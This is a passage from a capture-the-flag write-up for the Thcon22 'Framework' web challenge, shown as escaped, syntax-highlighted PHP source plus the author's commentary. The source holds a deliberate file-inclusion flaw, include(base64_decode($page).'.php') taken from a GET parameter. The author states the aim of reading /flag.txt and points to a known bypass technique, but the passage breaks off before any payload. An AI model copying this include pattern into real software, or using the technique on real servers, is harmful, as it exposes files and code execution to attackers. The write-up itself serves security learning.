&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;href=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;css&amp;#x2F;style.css&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;meta &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;charset=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;utf-8&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;meta &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;name=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;viewport&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;content=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;width=device-width, initial-scale=1&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;title&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Framework&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;title&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;head&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;body&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;class=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;headers&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;		&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;class=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;inner_headers&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;			&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;class=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;logo_c&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;				&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;h1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Thcon22&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;span&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Framework&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;span&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;h1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;			&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;				&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;ul &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;class=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;nav&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;amp;lt;?php
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	createHeaders(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;array&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;change_profile&amp;amp;#39; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;amp;gt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;Edit&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;view_profile&amp;amp;#39; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;amp;gt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;View&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;), $safe_handler);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;?&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;			&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;ul&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;		&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;class=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;blank_space&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;amp;lt;?php
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;isset&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;page&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;]) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; !&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;empty&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;page&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;]) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;isset&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;pHash&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;]) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; !&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;empty&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;pHash&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;]))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		$page &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;page&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;];
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		$hash &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;pHash&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;];
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($safe_handler-&amp;amp;gt;handle($page, $hash))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;			&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;include&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;base64_decode&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($page) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;. &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;.php&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;else
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;			&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;lt;h2&amp;amp;gt;Integrity verification failed...&amp;amp;lt;&amp;#x2F;h2&amp;amp;gt;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;else&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;?&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;h1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Welcome to the profile editor !&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;h1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;p&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Here you can create and edit your profile.&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;br&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; A card will be created for your Thcon22 participation.&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;br&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; We hope you will like the rendering !&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;p&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;amp;lt;?php
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;?&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;body&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;html&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Now we know for certain how files are loaded - &amp;lt;code&amp;gt;include(base64_decode($page) . &amp;#x27;.php&amp;#x27;)&amp;lt;&amp;#x2F;code&amp;gt;. We need to find a way to load &amp;lt;code&amp;gt;&amp;#x2F;flag.txt&amp;lt;&amp;#x2F;code&amp;gt; even though &amp;lt;code&amp;gt;.php&amp;lt;&amp;#x2F;code&amp;gt; is always appended.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;getting-the-flag&amp;quot;&amp;gt;Getting the Flag&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;When I participated in hxp CTF 2021 we faced &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;lewin.co.il&amp;#x2F;winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021&amp;#x2F;&amp;quot;&amp;gt;a similar problem&amp;lt;&amp;#x2F;a&amp;gt;, and I remember &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;gist.github.com&amp;#x2F;loknop&amp;#x2F;b27422d355ea1fd0d90d6dbc1e278d4d&amp;quot;&amp;gt;&amp;lt;code&amp;gt;loknop&amp;lt;&amp;#x2F;code&amp;gt; developed a creative solution&amp;lt;&amp;#x2F;a&amp;gt; using only &amp;lt;a rel=&amp;quot;noopener&amp;quot; 